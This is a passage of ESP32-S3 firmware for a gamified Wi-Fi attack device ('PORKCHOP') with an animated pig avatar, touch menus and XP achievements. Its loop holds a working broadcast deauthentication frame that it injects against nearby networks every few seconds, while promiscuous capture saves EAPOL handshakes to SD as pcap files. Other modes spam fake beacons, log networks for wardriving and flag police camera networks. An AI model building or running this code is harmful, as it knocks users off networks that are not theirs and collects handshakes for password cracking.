    if(!sdOk) return false;
    if(pcapCapturing) return true;
    uint32_t up=(millis()-bootT)/1000;
    snprintf(pcapFname,sizeof(pcapFname),"/captures/%s_%06lu.pcap",tag,up);
    pcapFile=SD_MMC.open(pcapFname,FILE_WRITE);
    if(!pcapFile){ Serial.println("[PCAP] open failed"); return false; }
    pcapWriteGlobalHeader(pcapFile);
    pcapFile.flush();
    pcapPacketCount=0; pcapBytesWritten=sizeof(PcapGlobalHdr); eapolSeenCount=0;
    rawRingW=0; rawRingR=0;  // reset ring
    esp_wifi_set_promiscuous_rx_cb(pcapPromiscCb);
    esp_wifi_set_promiscuous(true);
    pcapCapturing=true;
    Serial.printf("[PCAP] capturing to %s\n",pcapFname);
    return true;
}

// Stop capture, flush and close the file
static void pcapStop(){
    if(!pcapCapturing) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    pcapCapturing=false;
    if(pcapFile){ pcapFile.flush(); pcapFile.close(); }
    Serial.printf("[PCAP] stopped: %lu packets, %lu bytes -> %s\n",
        (unsigned long)pcapPacketCount,(unsigned long)pcapBytesWritten,pcapFname);
}

// Drain the ring buffer on the main thread — call every loop() iteration while capturing.
// This is where the actual SD write happens, well away from ISR context.
static void pcapDrainRing(){
    if(!pcapCapturing) return;
    uint32_t baseMicros = micros();
    uint8_t guard=0;
    while(rawRingR!=rawRingW && guard<RAW_RING_SIZE){
        guard++;
        volatile RawCapFrame& slot=rawRing[rawRingR];
        uint16_t len=slot.len;
        uint8_t localBuf[RAW_FRAME_MAXLEN];
        memcpy(localBuf,(void*)slot.data,len);  // copy out before advancing read index
        uint32_t frameUs = slot.micros_ts;
        rawRingR=(rawRingR+1)%RAW_RING_SIZE;

        if(frameLooksLikeEAPOL(localBuf,len)){ eapolSeenCount++; hs++; }

        // Approximate wall-clock seconds since boot for the pcap timestamp —
        // good enough for offline analysis ordering, this device has no RTC
        uint32_t wallUs = (millis()-bootT)*1000UL + (frameUs%1000UL);
        pcapWriteFrame(pcapFile, localBuf, len, wallUs);
        pcapPacketCount++;
        pcapBytesWritten += sizeof(PcapRecHdr)+len;
    }
    // Flush periodically rather than every packet — SD writes are slow
    static uint32_t lastFlush=0;
    if(millis()-lastFlush>1000){ lastFlush=millis(); pcapFile.flush(); }
}

// Draw avatar into framebuffer — translated from original CYD Avatar::draw()
static void avDrawToFB(int pigY=4, int grassY=78){
    uint32_t now=millis();
    int shakeY=0;
    if(avTrans||grassMoving){
        static const int bounce[4]={0,-3,-1,-2};
        shakeY=bounce[(now/80)%4];
    }
    int si=avState; if(si>=7)si=0;
    const char** fr=avRight?FRAMES_R[si]:FRAMES_L[si];
    int sx=avX, sy=pigY+shakeY;
    // Row 0: ears
    fbStr(sx,TBH+sy,fr[0],FG(),BG(),3);
    // Row 1: face with blink/sniff
    char faceRow[16]; strncpy(faceRow,fr[1],15); faceRow[15]=0;
    if(avBlink){
        if(avRight) faceRow[1]='-';
        else        faceRow[4]='-';
        avBlink=false;
    }
    if(avSniff){
        char n1,n2;
        switch(avSniffFrame){
            case 1: n1='o';n2='O'; break;
            case 2: n1='O';n2='o'; break;
            default:n1='o';n2='o'; break;
        }
        if(avRight){faceRow[3]=n1;faceRow[4]=n2;}
        else{faceRow[1]=n1;faceRow[2]=n2;}
    }
    fbStr(sx,TBH+sy+22,faceRow,FG(),BG(),3);
    // Row 2: body with tail
    char body[16];
    if(avRight) strncpy(body,"z(    )",sizeof(body));
    else        strncpy(body,"(    )z",sizeof(body));
    int bx=avRight?(sx-18):sx;
    fbStr(bx,TBH+sy+44,body,FG(),BG(),3);
    // Grass row — size 2, just below body
    avUpdateGrass();
    fbStr(0,TBH+grassY,grassPat,FG(),BG(),2);
}

static void drawAll(M m){
    const char* mn2[]={"IDLE","MENU","OINK","DNH","WARHOG","SPEC","BACON","STATS","CAP","ACH","DIAG","SET","PAT"};
    uint8_t mi2=(uint8_t)m;

    switch(m){

    case M::IDLE:{
        cCls(BG());
        avDrawToFB(4, 78);
        cPf(2,100,FG(),BG(),2,"N:%-2d HS:%lu XP:%lu",netCnt,(unsigned long)hs,(unsigned long)xp);
        cPf(2,118,FG(),BG(),2,"LVL:%d  %s",lv,TH[ti].name);
        cStr(2,140,"TAP=MENU  HOLD=THEME",GREY,BG(),1);
        break;}

    case M::MENU:{
        cCls(BG());
        // Header bar
        cFill(0,0,DW,18,FG());
        char hdr[28]; snprintf(hdr,sizeof(hdr),"PORKCHOP  L%d",lv);
        cStr(4,1,hdr,BG(),FG(),2);
        // Menu items
        for(int i=0;i<MV;i++){
            int idx=mScr+i; if(idx>=MC)break;
            bool sel=(idx==mSel);
            cFill(0,20+i*22,DW,21,sel?FG():BG());
            cStr(16,20+i*22+4,MI[idx],sel?BG():FG(),sel?FG():BG(),2);
            if(sel) cStr(2,20+i*22+4,">",sel?BG():FG(),sel?FG():BG(),2);
        }
        break;}

    case M::OINK:{
        cCls(BG());
        // Net list at top
        int oy=2;
        if(netCnt>0){
            cPf(2,oy,FG(),BG(),1,"FOUND %d TRUFFLES:",netCnt); oy+=12;
            for(int i=0;i<min((int)netCnt,5);i++){
                uint16_t c=nets[i].rssi>-65?GREEN:nets[i].rssi>-80?YELLOW:RED;
                cPf(2,oy,c,BG(),1,"%-18s %d",nets[i].ssid[0]?nets[i].ssid:"[hidden]",nets[i].rssi);
                oy+=10;
            }
        } else {
            cStr(2,oy,scanning?"SNIFFING...":"TAP=SCAN",FG(),BG(),1); oy+=12;
        }
        // Pig walks below net list
        avDrawToFB(70,144);
        // Stats bottom — real pcap capture status
        if(pcapCapturing){
            cPf(2,158,GREEN,BG(),1,"REC: %lu pkts %luKB",
                (unsigned long)pcapPacketCount,(unsigned long)(pcapBytesWritten/1024));
            cPf(2,168,FG(),BG(),1,"EAPOL seen:%lu DE:%lu",(unsigned long)eapolSeenCount,(unsigned long)de);
        } else {
            cStr(2,158,sdOk?"PCAP: SD not started":"PCAP: NO SD CARD",RED,BG(),1);
            cPf(2,168,FG(),BG(),1,"HS:%lu DE:%lu",(unsigned long)hs,(unsigned long)de);
        }
        break;}

    case M::DNH:{
        cCls(BG());
        int dy=2;
        cStr(2,dy,"DNH: PASSIVE ONLY",GREEN,BG(),1); dy+=12;
        for(int i=0;i<min((int)netCnt,5);i++){
            cPf(2,dy,FG(),BG(),1,"%-18s %d",nets[i].ssid[0]?nets[i].ssid:"[hidden]",nets[i].rssi);
            dy+=10;
        }
        avDrawToFB(70,144);
        if(pcapCapturing){
            cPf(2,158,GREEN,BG(),1,"REC: %lu pkts %luKB",
                (unsigned long)pcapPacketCount,(unsigned long)(pcapBytesWritten/1024));
            cPf(2,168,FG(),BG(),1,"EAPOL seen:%lu",(unsigned long)eapolSeenCount);
        } else {
            cStr(2,158,sdOk?"PCAP: SD not started":"PCAP: NO SD CARD",RED,BG(),1);
            cPf(2,168,FG(),BG(),1,"NETS:%d HS:%lu",netCnt,(unsigned long)hs);
        }
        break;}

    case M::WARHOG:{
        cCls(BG());
        avDrawToFB(70,144);
        cPf(2,2,FG(),BG(),1,"[ SGT WARHOG ] LOGGED:%d",wdCnt);
        for(int i=0;i<min((int)netCnt,5);i++)
            cPf(2,14+i*10,FG(),BG(),1,"%-18s ch%d",nets[i].ssid[0]?nets[i].ssid:"[hidden]",nets[i].ch);
        cPf(2,160,FG(),BG(),1,"UNIQUE:%d XP:%lu",wdCnt,(unsigned long)xp);
        break;}

    case M::SPEC:{
        cCls(BG());
        // ── Update spectrum buffers ──────────────────────────────
        // Noise floor
        for(int x=0;x<SPEC_W;x++) specBuf[x]=-95+(int8_t)(specNoise()>>1);
        // Sinc lobes from each network
        for(int ni=0;ni<(int)netCnt;ni++){
            float cFreq=2412.0f+(nets[ni].ch-1)*5.0f;
            int8_t rssi=nets[ni].rssi;
            for(int x=0;x<SPEC_W;x++){
                float freq=(specViewCtr-30.0f)+(float)x*60.0f/SPEC_W;
                float amp=specSincAmp(freq-cFreq);
                if(amp<0.05f) continue;
                int8_t sig=-95+(int8_t)((rssi+95)*amp);
                if(sig>specBuf[x]) specBuf[x]=sig;
            }
        }
        // Peak hold with decay
        for(int x=0;x<SPEC_W;x++){
            if(specBuf[x]>specPeak[x]) specPeak[x]=specBuf[x];
            else if(specPeak[x]>-95) specPeak[x]--;
        }
        // Waterfall push every 80ms
        uint32_t _sn=millis();
        if(_sn-wfallLastMs>80){
            wfallLastMs=_sn;
            for(int x=0;x<SPEC_W;x++){
                int inten=(int)((specBuf[x]+95)*255/65);
                wfallBuf[wfallRow][x]=(uint8_t)constrain(inten,0,255);
            }
            wfallRow=(wfallRow+1)%WFALL_ROWS;
        }
        // ── Draw ────────────────────────────────────────────────
        // Y-axis dB labels
        for(int8_t db=-30;db>=-90;db-=20){
            int y=specRssiToY(db);
            cFill(SPEC_LEFT-2,y,2,1,FG());
            cPf(0,y-4,FG(),BG(),1,"%d",db);
        }
        // Axes
        cFill(SPEC_LEFT-1,SPEC_TOP,1,SPEC_BOT-SPEC_TOP,FG());  // Y axis
        cFill(SPEC_LEFT-1,SPEC_BOT,SPEC_W+1,1,FG());            // X axis
        // Noise grass
        for(int x=SPEC_LEFT;x<SPEC_LEFT+SPEC_W;x++){
            int g=specNoise()>>1;
            if(g>0) cFill(x,SPEC_BOT-g,1,g,FG());
        }
        // Spectrum fill + peak dots
        for(int x=0;x<SPEC_W;x++){
            int sy=specRssiToY(specBuf[x]);
            int by=SPEC_BOT;
            if(sy<by) cFill(SPEC_LEFT+x,sy,1,by-sy,FG());
            int py=specRssiToY(specPeak[x]);
            if(py<by-1) cFill(SPEC_LEFT+x,py,1,1,FG());
        }
        // Channel markers
        for(int ch=1;ch<=13;ch++){
            float f=2412.0f+(ch-1)*5.0f;
            int cx=specFreqToX(f);
            if(cx<SPEC_LEFT||cx>=SPEC_LEFT+SPEC_W) continue;
            cFill(cx,SPEC_BOT,1,4,FG());
            cPf(cx-3,SPEC_BOT+6,FG(),BG(),1,"%d",ch);
        }
        // Waterfall separator
        cFill(SPEC_LEFT,WFALL_TOP-2,SPEC_W,1,FG());
        // Waterfall rows
        for(int row=0;row<WFALL_ROWS;row++){
            int bufRow=(wfallRow+row)%WFALL_ROWS;
            int wy=WFALL_TOP+row;
            if(wy>=MH-10) break;
            for(int x=0;x<SPEC_W;x++){
                uint8_t inten=wfallBuf[bufRow][x];
                if(inten<20) continue;
                bool draw=false;
                if(inten>200)      draw=true;
                else if(inten>150) draw=((x+row)%2)==0;
                else if(inten>100) draw=(x%2==0)&&(row%2==0);
                else if(inten>50)  draw=(x%3==0)&&(row%2==0);
                else               draw=(x%4==0)&&(row%3==0);
                if(draw) cFill(SPEC_LEFT+x,wy,1,1,FG());
            }
        }
        cStr(2,MH-10,"HOLD=BACK",GREY,BG(),1);
        break;}

    case M::BACON:{
        cCls(BG());
        cStr(2,2,"[ BACON MODE ]",FG(),BG(),2);
        cStr(2,22,"FAKE BEACON TX",FG(),BG(),1);
        cPf(2,34,CYAN,BG(),2,"%s",BSSID[baconSel]);
        cPf(2,56,FG(),BG(),1,"TX: %lu  TIER:%d",baconCnt,1);
        cStr(2,70,"TAP=NEXT SSID",GREY,BG(),1);
        cStr(2,82,"HOLD=STOP",GREY,BG(),1);
        // Pig sizzles
        avDrawToFB(96,170);
        break;}

    case M::PAT:{
        cCls(BG());
        // Run patrol scan every 2s
        if(!patrolRunning){ patrolRunning=true; avState=3; grassMoving=true; } // HUNTING state
        { uint32_t _pn=millis(); if(_pn-patrolLastScan>2000){ patrolScan(); patrolLastScan=_pn; } }
        // Pig hunts through grass
        avDrawToFB(70,144);
        // Header
        cStr(2,2,"[ PORK PATROL ]",FG(),BG(),1);
        cStr(2,12,"FLOCK + AXON BODYCAM DETECT",FG(),BG(),1);
        // Detection counts
        uint16_t fc=patrolFlockCnt, bc=patrolBWCCnt;
        if(fc||bc){
            // Alert!
            cPf(2,26,RED,BG(),2,"!! ALERT !!");
            cPf(2,46,RED,BG(),2,"FLOCK: %d",fc);
            cPf(2,66,RED,BG(),2,"BWC:   %d",bc);
        } else {
            cStr(2,26,"SCANNING...",FG(),BG(),1);
            cPf(2,38,FG(),BG(),1,"NETS: %d  TOTAL: %lu",netCnt,(unsigned long)patrolTotal);
            cStr(2,50,"no cameras found yet",GREY,BG(),1);
        }
        cPf(2,160,FG(),BG(),1,"NETS:%d  HOLD=STOP",netCnt);
        break;}

    case M::STATS:{
        cCls(BG());
        uint32_t up=(millis()-bootT)/1000;
        cStr(2,2,"[ SWINE STATS ]",FG(),BG(),2);
        cPf(2,22,FG(),BG(),2,"UP:  %02lu:%02lu:%02lu",up/3600,(up%3600)/60,up%60);
        cPf(2,42,FG(),BG(),2,"LVL: %d  XP: %lu",lv,(unsigned long)xp);
        cPf(2,62,FG(),BG(),2,"NETS:%d  HS:%lu",netCnt,(unsigned long)hs);
        cPf(2,82,FG(),BG(),2,"DE:  %lu  BCN:%lu",(unsigned long)de,(unsigned long)baconCnt);
        cPf(2,102,FG(),BG(),2,"WD:  %d unique",wdCnt);
        cPf(2,122,FG(),BG(),2,"HEAP:%dKB",(int)(ESP.getFreeHeap()/1024));
        cStr(2,150,"TAP=BACK  HOLD=BACK",GREY,BG(),1);
        break;}

    case M::CAP:{
        cCls(BG());
        cStr(2,2,"[ CAPTURES / L00T ]",FG(),BG(),2);
        cPf(2,24,FG(),BG(),1,"HANDSHAKES: %lu  DEAUTHS: %lu",(unsigned long)hs,(unsigned long)de);
        cPf(2,36,FG(),BG(),1,"WARDRIVE: %d   BEACONS: %lu",wdCnt,(unsigned long)baconCnt);
        cPf(2,52,sdOk?GREEN:RED,BG(),2,"SD: %s",sdOk?"READY":"NO CARD");
        if(pcapCapturing){
            cPf(2,76,GREEN,BG(),1,"PCAP REC: %s",pcapFname);
            cPf(2,88,GREEN,BG(),1,"%lu packets, %luKB",
                (unsigned long)pcapPacketCount,(unsigned long)(pcapBytesWritten/1024));
        } else if(sdOk){
            cStr(2,76,"PCAP: not currently capturing",GREY,BG(),1);
            cStr(2,88,"Enter OINK or DNH to start",GREY,BG(),1);
        } else {
            cStr(2,76,"Insert FAT32 microSD",GREY,BG(),1);
            cStr(2,88,"to enable pcap capture.",GREY,BG(),1);
        }
        cStr(2,106,"Files saved to:",GREY,BG(),1);
        cStr(2,118,"/captures/*.pcap (raw 802.11)",GREY,BG(),1);
        cStr(2,130,"/wigle/*.csv (wardrive)",GREY,BG(),1);
        cStr(2,142,"/logs/porkchop.log",GREY,BG(),1);
        cStr(2,158,"Hold WARHOG to save CSV",GREY,BG(),1);
        break;}

    case M::ACH:{
        struct{const char* n;bool u;}A[]={
            {"FIRST BLOOD",netCnt>0},{"PACKET SNOUT",hs>0},
            {"DEAUTH HOG",de>0},{"10 NETS",netCnt>=10},
            {"50 NETS",netCnt>=50},{"LEVEL 5",lv>=5},
            {"XP 1000",xp>=1000},{"WARDRIVE",wdCnt>0},
            {"BACON 100",baconCnt>=100},{"HS x5",hs>=5},
        };
        cCls(BG());
        cStr(2,2,"[ ACHIEVEMENTS ]",FG(),BG(),2);
        for(int i=0;i<10;i++){
            int idx=achScr+i; if(idx>=10)break;
            cPf(2,22+i*17,A[idx].u?GREEN:GREY,BG(),1,
                "%s %s",A[idx].u?"[X]":"[ ]",A[idx].n);
        }
        cStr(2,185,"TAP UP/DN  HOLD=BACK",GREY,BG(),1);
        break;}

    case M::DIAG:{
        cCls(BG());
        cStr(2,2,"[ DIAGNOSTICS ]",FG(),BG(),2);
        cPf(2,26,FG(),BG(),2,"HEAP:   %dKB",(int)(ESP.getFreeHeap()/1024));
        cPf(2,46,FG(),BG(),2,"SKETCH: %dKB",(int)(ESP.getSketchSize()/1024));
        cPf(2,66,FG(),BG(),2,"NETS:   %d %s",netCnt,scanning?"SCAN":"IDLE");
        cPf(2,86,FG(),BG(),2,"UPTIME: %lus",(unsigned long)((millis()-bootT)/1000));
        cStr(2,110,"DISP:  ILI9341V bare-SPI",FG(),BG(),1);
        cStr(2,122,"TOUCH: FT6336G I2C",FG(),BG(),1);
        cStr(2,134,"SFX:   LEDC ch0 IO21",FG(),BG(),1);
        cStr(2,146,"BOARD: Hosyond ESP32-S3",FG(),BG(),1);
        cPf(2,158,FG(),BG(),1,"FB:    %dKB",(int)(sizeof(FB)/1024));
        cPf(2,170,sdOk?GREEN:RED,BG(),1,"SD:    %s",sdOk?"OK":"NO CARD");
        break;}

    case M::SET:{
        cCls(BG());
        cStr(2,2,"[ SETTINGS ]",FG(),BG(),2);
        cFill(0,24,DW,36,FG());
        cStr(4,28,TH[ti].name,BG(),FG(),3);
        cStr(4,52,"< TAP TOP: CYCLE THEME >",BG(),FG(),1);
        cPf(2,74,soundOn?GREEN:RED,BG(),2,"SOUND: %s",soundOn?"ON":"OFF");
        cStr(2,96,"TAP BTM: TOGGLE SOUND",GREY,BG(),1);
        cStr(2,112,"HOLD: SAVE + EXIT",GREY,BG(),1);
        break;}

    default: mode=M::IDLE; break;
    }

    // Top bar
    fbFill(0,0,DW,TBH,FG());
    fbStr(2,4,mi2<13?mn2[mi2]:"??",BG(),FG(),2);
    fbPf(100,4,BG(),FG(),2,"H:%dK",(int)(ESP.getFreeHeap()/1024));
    fbPf(230,4,BG(),FG(),2,"L%d",lv);

    // Bottom bar
    fbFill(0,DH-BBH,DW,BBH,BG());
    fbFill(0,DH-BBH,DW,1,FG());
    fbStr(2,DH-BBH+3,PH[phI],FG(),BG(),2);

    // Flush
    fbFlush();
}

static void handleMenu(TE& e){
    if(!e.tap&&!e.hld)return;
    if(e.hld){mode=M::IDLE;sfxClick();return;}
    if(e.x<30&&e.y<TBH+30){mode=M::IDLE;return;}
    int my=e.y-TBH;
    if(my<MH/3){if(mSel>0)mSel--;if(mSel<mScr)mScr=mSel;}
    else if(my<(MH*2)/3){
        mode=MM[mSel];mScr=0;mSel=0;sfxClick();
        if(mode==M::OINK)      pcapStart("oink");
        else if(mode==M::DNH)  pcapStart("dnh");
    }
    else{if(mSel<MC-1)mSel++;if(mSel>=mScr+MV)mScr=mSel-MV+1;}
}

void loop(){
    uint32_t now=millis();

    pcapDrainRing();  // pull captured frames off the ISR ring, write to SD
    checkScan();
    // Dont scan while injecting — causes ESP32-S3 crash
    bool canScan=(mode!=M::OINK&&mode!=M::BACON);
    if(canScan&&!scanning&&now-lastScan>12000)startScan();
    if(now-lastPh>18000){lastPh=now;phI=(phI+1)%NP;}
    if(netCnt>0){static uint32_t lt=0;if(now-lt>10000){lt=now;xp+=netCnt;}}
    if(xp>=(uint32_t)lv*lv*100){lv++;sfxAch();sdSaveLog("LEVEL UP");}
    {static uint32_t ls=0;if(now-ls>60000){ls=now;prefs.begin("pork",false);prefs.putULong("x",xp);prefs.putUChar("l",lv);prefs.end();}}



    // NeoPixel effects
    if(mode==M::PAT){
        patrolSiren();
    } else if(mode==M::OINK){
        // Slow green pulse
        static uint32_t lastOinkFlash=0;
        static bool oinkOn=false;
        if(now-lastOinkFlash>500){
            lastOinkFlash=now; oinkOn=!oinkOn;
            neo.setPixelColor(0, oinkOn?neo.Color(0,180,0):neo.Color(0,40,0));
            neo.show();
        }
    } else if(mode==M::WARHOG){
        // Purple pulse for wardriving
        static uint32_t lastWHFlash=0;
        static bool whOn=false;
        if(now-lastWHFlash>600){
            lastWHFlash=now; whOn=!whOn;
            neo.setPixelColor(0, whOn?neo.Color(120,0,180):neo.Color(30,0,45));
            neo.show();
        }
    } else if(mode==M::BACON){
        // Solid red for beacon spam
        { static M lastM=M::IDLE; if(lastM!=M::BACON){neo.setPixelColor(0,neo.Color(180,0,0));neo.show();lastM=M::BACON;} }
    } else {
        neo.setPixelColor(0,0,0,0); neo.show();
    }

    TE ev=pollT();

    uint32_t rate=200;
    if(mode==M::IDLE)rate=500;  // full rebuild rate
    if(mode==M::MENU)rate=80;

    static uint32_t lastDraw=0;
    static bool first=true;
    bool doRedraw=first||(now-lastDraw>=rate)||(mode!=lastMode)||ev.tap||ev.hld;
    if(doRedraw){first=false;lastDraw=now;lastMode=mode;}

    // ── Avatar update (runs every loop) ─────────────────────────────
    avUpdateGrass();
    // Blink timer
    if(now-avLastBlink>avBlinkInt){
        avBlink=true; avLastBlink=now; avBlinkInt=random(4000,8000); doRedraw=true;
    }
    // Sniff timeout
    if(avSniff){
        if(now-avSniffStart>600){ avSniff=false; avSniffFrame=0; doRedraw=true; }
        else{ avSniffFrame=((now-avSniffStart)/100)%3; doRedraw=true; }
    }
    // Walk transition
    if(avTrans){
        uint32_t el=now-avTransStart;
        if(el>=AV_TRANS_MS){
            avTrans=false; avX=avToX; avRight=avToRight; avOnRight=(avX>85);
        } else {
            float t=(float)el/AV_TRANS_MS;
            float s=t*t*t*(t*(t*6.0f-15.0f)+10.0f);
            avX=avFromX+(int)((avToX-avFromX)*s);
        }
        doRedraw=true;
    }
    // Look/walk when idle
    if(mode==M::IDLE && !avTrans && !grassMoving){
        if(now-avLastLook>avLookInt){
            int r=random(0,100);
            if(r<35){ avRight=!avRight; doRedraw=true; }
            else if(r<55){ avRight=!avRight; doRedraw=true; }
            else if(r<70){ avSniff=true; avSniffStart=now; avSniffFrame=0; doRedraw=true; }
            else if(r<82){ avBlink=true; doRedraw=true; }
            avLastLook=now; avLookInt=random(2000,12000);
        }
        if(now-avLastFlip>avFlipInt){
            int targetX=avOnRight?27:144;
            if(abs(targetX-avX)>15) avStartSlide(targetX,targetX>avX);
            avLastFlip=now; avFlipInt=random(30000,75000);
        }
    }
    // Grass moves in OINK/DNH/WARHOG
    if(mode==M::OINK||mode==M::DNH||mode==M::WARHOG){
        if(!grassMoving){ grassMoving=true; grassDir=(avX<85); }
    } else {
        grassMoving=false;
    }
    bool pigChanged=false;  // kept for partial redraw compat


    // Oink: inject only when WiFi is fully idle
    if(mode==M::OINK && !scanning && WiFi.scanComplete()!=WIFI_SCAN_RUNNING){
        static uint32_t lt=0;
        if(netCnt>0&&now-lt>3000){lt=now;
            static const uint8_t DF[]={0xC0,0,0x3A,1,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,0};
            // Briefly drop promiscuous for the channel switch + injection,
            // then restore it if a pcap capture is active — otherwise the
            // capture would silently stop after the first deauth burst.
            bool wasCapturing = pcapCapturing;
            esp_wifi_set_promiscuous(false);
            delay(10);
            for(int i=0;i<min((int)netCnt,2);i++){
                if(esp_wifi_set_channel(nets[i].ch,WIFI_SECOND_CHAN_NONE)==ESP_OK){
                    esp_wifi_80211_tx(WIFI_IF_STA,(void*)DF,sizeof(DF),false);
                    de++;xp+=2;
                }
            }
            if(wasCapturing){
                esp_wifi_set_promiscuous_rx_cb(pcapPromiscCb);
                esp_wifi_set_promiscuous(true);
            }
        }
    }

    // Beacon spam - only when WiFi fully idle
    if(mode==M::BACON && !scanning && WiFi.scanComplete()!=WIFI_SCAN_RUNNING){
        static uint32_t lt=0;if(now-lt>200){lt=now;
        static const uint8_t BT[]={0x80,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x42,0x41,0x43,0x4F,0x4E,0,0x42,0x41,0x43,0x4F,0x4E,0,0,0,0x64,0,0x11,4};
        uint8_t fr[200];int fl=sizeof(BT);memcpy(fr,BT,fl);
        const char* s=BSSID[baconSel];uint8_t sl=strlen(s);
        fr[fl++]=0;fr[fl++]=sl;memcpy(fr+fl,s,sl);fl+=sl;
        fr[fl++]=3;fr[fl++]=1;fr[fl++]=(baconCnt%13)+1;
        esp_wifi_80211_tx(WIFI_IF_STA,(void*)fr,fl,false);baconCnt++;}
    }

    // Wardrive log
    if(mode==M::WARHOG){
        for(int i=0;i<(int)netCnt&&wdCnt<MWD;i++){
            bool f=false;for(int j=0;j<wdCnt;j++)if(!strcmp(wd[j].ssid,nets[i].ssid)){f=true;break;}
            if(!f){strncpy(wd[wdCnt].ssid,nets[i].ssid,32);wd[wdCnt].rssi=nets[i].rssi;wd[wdCnt++].ch=nets[i].ch;xp++;}
        }
    }

    // Touch handling
    switch(mode){
    case M::IDLE:
        if(patrolRunning){patrolRunning=false;avState=0;grassMoving=false;}
        if(pcapCapturing) pcapStop();  // safety: ensure capture always stops in IDLE
        if(ev.tap){mode=M::MENU;sfxClick();}
        if(ev.hld){ti=(ti+1)%TC;sfxClick();}
        break;
    case M::MENU: handleMenu(ev); break;
    case M::OINK:
        if(ev.hld||(ev.tap&&ev.x<30&&ev.y<TBH+30)){
            pcapStop();
            mode=M::IDLE;
        }
        break;
    case M::DNH:
        if(ev.hld){
            pcapStop();
            mode=M::IDLE;
        }
        break;
    case M::WARHOG:
        if(ev.hld){
            if(wdCnt>0){ sdSaveWardrive(); sdSaveLog("wardrive saved"); }
            mode=M::IDLE;
        }
        break;
    case M::SPEC:
        if(ev.hld||(ev.tap&&ev.x<30))mode=M::IDLE;
        break;
    case M::BACON:
        if(ev.tap){baconSel=(baconSel+1)%6;sfxClick();}
        if(ev.hld)mode=M::IDLE;
        break;
    case M::PAT:
        if(ev.hld||(ev.tap&&ev.x<30)){
            patrolRunning=false; avState=0; grassMoving=false; mode=M::IDLE;
        }
        break;
    case M::STATS:
        if(ev.tap){swTab=(swTab+1)%2;sfxClick();}
        if(ev.hld)mode=M::IDLE;
        break;
    case M::CAP:
        if(ev.hld||(ev.tap&&ev.x<30))mode=M::IDLE;
        break;
    case M::ACH:
        if(ev.tap){int my=ev.y-TBH;if(my<MH/2){if(achScr>0)achScr--;}else{if(achScr<4)achScr++;}}
        if(ev.hld)mode=M::IDLE;
        break;
    case M::DIAG:
        if(ev.hld||(ev.tap&&ev.x<30))mode=M::IDLE;
        break;
    case M::SET:
        if(ev.hld){prefs.begin("pork",false);prefs.putUChar("t",ti);prefs.putBool("s",soundOn);prefs.end();mode=M::IDLE;sfxClick();}
        else if(ev.tap){if(ev.y-TBH<MH/2){ti=(ti+1)%TC;sfxClick();}else soundOn=!soundOn;}
        break;
    default: mode=M::IDLE; break;
    }

    if(doRedraw){
        drawAll(mode);
    } else if(pigChanged){
        doRedraw=true;
    }
    fbFlush();  // always push to keep display alive
    delay(16);
}
